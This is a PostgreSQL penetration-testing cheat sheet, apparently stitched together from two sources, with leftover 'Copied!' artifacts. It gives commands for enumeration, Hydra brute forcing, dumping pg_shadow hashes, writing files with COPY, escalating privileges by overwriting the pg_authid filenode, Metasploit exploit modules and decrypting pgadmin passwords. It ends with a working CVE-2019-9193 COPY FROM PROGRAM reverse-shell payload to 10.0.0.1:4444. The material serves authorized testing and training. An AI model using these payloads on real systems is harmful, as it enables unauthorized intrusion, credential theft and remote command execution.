# 5432,5433 - Pentesting Postgresql

## **Basic Information**

**PostgreSQL** is described as an **object-relational database system** that is **open source**. This system not only utilizes the SQL language but also enhances it with additional features. Its capabilities allow it to handle a wide range of data types and operations, making it a versatile choice for developers and organizations.

**Default port:** 5432, and if this port is already in use it seems that postgresql will use the next port (5433 probably) which is not in use.

```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Enumeration
### Identify PostgreSQL
To identify the presence of PostgreSQL, nmap can be quite handy:
```
nmap -sV -p 5432 <target-host>
```
This scans for open PostgreSQL services running on their default port (5432) and attempts to determine the version.

## Version Enumeration
Knowing the version of PostgreSQL can give insights into specific vulnerabilities:
```
nmap -sV --script=postgresql-info -p 5432 <target-host>
```
## Connect & Basic Enum

```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\dt # List tables in the current database:
\du+ # Get users roles

# Extract data from a specific table:
Extract data from a specific table:

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# Dumping Hashes
SELECT usename, passwd FROM pg_shadow;
These hashes can be attempted to crack with tools like John The Ripper or hashcat.

# Accessing File System
PostgreSQL can interact with the underlying file system. With enough privileges, an attacker could read or write files, depending on the database’s permissions:
COPY (SELECT * FROM sensitive_table) TO '/tmp/sensitive_data.txt';

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
# Attack Vectors
## Default Credentials
Many PostgreSQL installations use default or weak credentials. Attempt to log in using common defaults like postgres for both username and password.

## Brute Forcing Credentials with Hydra
Before gaining access, it might be necessary to brute force credentials. Tools like Hydra can help in this regard:
```
hydra -L userlist.txt -P passlist.txt <target-ip> postgres
```
## Exploiting Known Vulnerabilities
Check for publicly known vulnerabilities in the specific PostgreSQL version using tools like searchsploit:
```
searchsploit postgresql <version>
```
## Automatic Enumeration

```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

### Privesc by Overwriting Internal PostgreSQL Tables

The attack steps are:

1. Obtain the PostgreSQL data directory
2. Obtain a relative path to the filenode, associated with the `pg_authid` table
3. Download the filenode through the `lo_*` functions
4. Get the datatype, associated with the `pg_authid` table
5. Use the [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) to [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg_authid-table); set all `rol*` boolean flags to 1 for full permissions.
6. Re-upload the edited filenode via the `lo_*` functions, and overwrite the original file on the disk
7. _(Optionally)_ Clear the in-memory table cache by running an expensive SQL query
8. You should now have the privileges of a full superadmin.

## **POST**

```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```

### logging

Inside the _**postgresql.conf**_ file you can enable postgresql logs changing:

```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```

Then, **restart the service**.

### pgadmin

[pgadmin](https://www.pgadmin.org) is an administration and development platform for PostgreSQL.\
You can find **passwords** inside the _**pgadmin4.db**_ file\
You can decrypt them using the _**decrypt**_ function inside the script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)

```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
PostgreSQL a relational database management system. Default port is 5432.

Enumeration
nmap --script pgsql-brute -p 5432 <target-ip>
Copied!
Brute Force Credentials
hydra -l username -P passwords.txt <target-ip> postgres
hydra -L usernames.txt -p password <target-ip> postgres

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts <target-ip>
msf> run
Copied!
Dump User Hashes
msfconsole
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> set rhosts <target-ip>
msf> set username <username>
msf> set password <password>
msf> run
Copied!

Config File
# Version 14.x
/etc/postgresql/14/main/postgresql.conf
# Version 15.x
/etc/postgresql/15/main/postgresql.conf
Copied!
Also we may find other locations by viewing environment variables. They are prefixed by PG.

env

# Results
PGUSER=xxxx
PGPASSWORD=xxxx
PGPASSFILE=xxxx
...
Copied!

Connect
Remote
# -W: Force password prompt
psql -h <target-ip> -p <target-port> -d <database> -U <username> -W
# -w: No password
psql -h <target-ip> -p <target-port> -d <database> -U <username> -w
Copied!

Commands in psql
# Print help
\?

# Print the version of PostgreSQL
select version();

# Display command history
\s

# List databases
\l

# Switch to the given database
\c <database_name>

# List tables
\dt

# Descibe the table information
\d <table_name>

# Get values in the table
select * from <table>;

# List all users
\du

# Exit psql shell
\q
Copied!

Get a Shell and Command Execution
msfconsole
msf> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf> set rhosts <target-ip>
msf> set lhost <local-ip>
msf> set tablename <table_name>
msf> set username <username>
msf> set password <password>
msf> run
shell
Copied!

Command Injection ( CVE-2019-9193 )
To execute arbitrary command, do the following steps. We’ll perform Reverse Shell. Of course we have to start a listener (e.g. nc -lvnp 4444) in local machine beforehand.

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
Copied!
References
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md
